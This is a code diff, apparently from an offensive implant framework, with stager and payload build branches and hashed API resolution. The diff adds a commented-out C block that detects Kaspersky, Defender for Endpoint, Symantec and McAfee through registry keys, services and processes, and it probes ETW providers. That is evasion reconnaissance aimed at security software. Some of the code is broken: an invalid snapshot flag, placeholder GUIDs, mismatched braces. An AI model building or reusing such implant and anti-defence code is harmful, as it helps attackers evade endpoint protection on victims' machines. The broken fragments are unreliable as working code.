@@ -138,6 +138,153 @@ namespace Main {
 
         MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
 
+	/* TODO:
+		#include <stdio.h>
+		#include <windows.h>
+		#include <tlhelp32.h>
+		#include <evntrace.h>
+		#include <evntcons.h>
+
+		// Function prototypes
+		void CheckRegistryKey(HKEY rootKey, const char* subKey);
+		void CheckService(const char* serviceName);
+		void CheckProcess(const char* processName);
+		void CheckETWProviders();
+		void CheckForSecurityProducts();
+
+		void CheckRegistryKey(HKEY rootKey, const char* subKey) {
+			HKEY hKey;
+			if (RegOpenKeyExA(rootKey, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+				printf("Registry key %s exists.\n", subKey);
+				RegCloseKey(hKey);
+			} else {
+				if (GetLastError() == ERROR_ACCESS_DENIED) {
+					printf("Insufficient permissions to access registry key %s.\n", subKey);
+				} else {
+					printf("Registry key %s does not exist.\n", subKey);
+				}
+			}
+		}
+
+		void CheckService(const char* serviceName) {
+			SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+			if (scmHandle) {
+				SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_QUERY_STATUS);
+				if (serviceHandle) {
+					SERVICE_STATUS serviceStatus;
+					if (QueryServiceStatus(serviceHandle, &serviceStatus)) {
+						if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
+							printf("Service %s is running.\n", serviceName);
+						} else {
+							printf("Service %s is not running.\n", serviceName);
+						}
+					} else {
+						printf("Failed to query service status for %s.\n", serviceName);
+					}
+					CloseServiceHandle(serviceHandle);
+				} else {
+					if (GetLastError() == ERROR_ACCESS_DENIED) {
+						printf("Insufficient permissions to access service %s.\n", serviceName);
+					} else {
+						printf("Service %s does not exist.\n", serviceName);
+					}
+				}
+				CloseServiceHandle(scmHandle);
+			} else {
+				printf("Failed to open service manager.\n");
+			}
+		}
+
+void CheckProcess(const char* processName) {
+    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_PROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+        printf("CreateToolhelp32Snapshot failed\n");
+        return;
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hProcessSnap, &pe32)) {
+        do {
+            if (_stricmp(pe32.szExeFile, processName) == 0) {
+                printf("Process %s is running.\n", processName);
+                CloseHandle(hProcessSnap);
+                return;
+            }
+        } while (Process32Next(hProcessSnap, &pe32));
+    }
+    CloseHandle(hProcessSnap);
+    printf("Process %s is not running.\n", processName);
+}
+
+void CheckETWProviders() {
+    // Array of ETW provider GUIDs for common security products
+    const GUID* providers[] = {
+        &GUID_DEVLOAD,                  // Example GUID for device load events (replace with actual product GUIDs)
+        &GUID_CIM,                      // Example GUID (replace with actual product GUIDs)
+        // Add more relevant GUIDs here for specific security products
+    };
+
+    printf("Checking for ETW providers...\n");
+
+    for (int i = 0; i < sizeof(providers) / sizeof(providers[0]); i++) {
+        // Start an ETW trace session to check for active providers
+        EVENT_TRACE_PROPERTIES* pTraceProperties = (EVENT_TRACE_PROPERTIES*)malloc(sizeof(EVENT_TRACE_PROPERTIES) + 64);
+        memset(pTraceProperties, 0, sizeof(EVENT_TRACE_PROPERTIES) + 64);
+        pTraceProperties->Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + 64;
+        pTraceProperties->Wnode.Guid = *providers[i];
+        pTraceProperties->Wnode.ClientContext = 1; // Kernel mode context
+
+        TRACEHANDLE traceHandle;
+        ULONG status = StartTrace(&traceHandle, "MyTraceSession", pTraceProperties);
+
+        if (status == ERROR_SUCCESS) {
+            printf("ETW provider %s is enabled.\n", providers[i]);
+            StopTrace(traceHandle, pTraceProperties->Wnode.Guid);
+        } else {
+            if (status == ERROR_ACCESS_DENIED) {
+                printf("Insufficient permissions to access ETW provider %s.\n", providers[i]);
+            } else {
+                printf("ETW provider %s is not enabled or does not exist.\n", providers[i]);
+            }
+        }
+        free(pTraceProperties);
+    }
+}
+
+void CheckForSecurityProducts() {
+    printf("Checking for security products...\n");
+
+    // Kaspersky
+    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\KasperskyLab");
+    CheckService("AVP"); // Kaspersky Antivirus service
+    CheckProcess("avp.exe");
+
+    // Microsoft Defender for Endpoint
+    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Microsoft Defender");
+    CheckService("Sense"); // MDE service
+    CheckProcess("MsSense.exe");
+
+    // Symantec Endpoint Protection
+    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Symantec\\Symantec Endpoint Protection");
+    CheckService("SepMasterService"); // SEP service
+    CheckProcess("ccsvchst.exe");
+
+    // McAfee Endpoint Security
+    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\McAfee\\Endpoint Security");
+    CheckService("McShield"); // McAfee service
+    CheckProcess("McShield.exe");
+
+    // ETW-TI provider check
+    CheckETWProviders();
+
+    printf("Note: This program checks for specific security products and their ETW providers.\n");
+
+        }
+
+
+		*/
+
     defer:
         Dispatcher::MessageQueue(out);
         return success;
@@ -152,6 +299,28 @@ namespace Main {
         x_assertb(Ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
 
         x_assertb(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));
+
+#if defined(PAYLOAD)
+// httpapi
+// pipeapi
+// enumapi
+// memapi
+// heapapi
+// utilapi
+// procapi
+// ioapi
+// secapi
+
+#elif defined(STAGER)
+// TODO: stager does not need everything and can reduce size by omitting certain api structs
+// httpapi
+// enumapi
+// memapi
+// heapapi
+// procapi
+// secapi
+// EnumSystem
+#endif
 
         x_assertb(F_PTR_HMOD(Ctx->nt.NtDelayExecution,              Ctx->modules.ntdll, NTDELAYEXECUTION));
         x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateEvent,                 Ctx->modules.ntdll, NTCREATEEVENT));
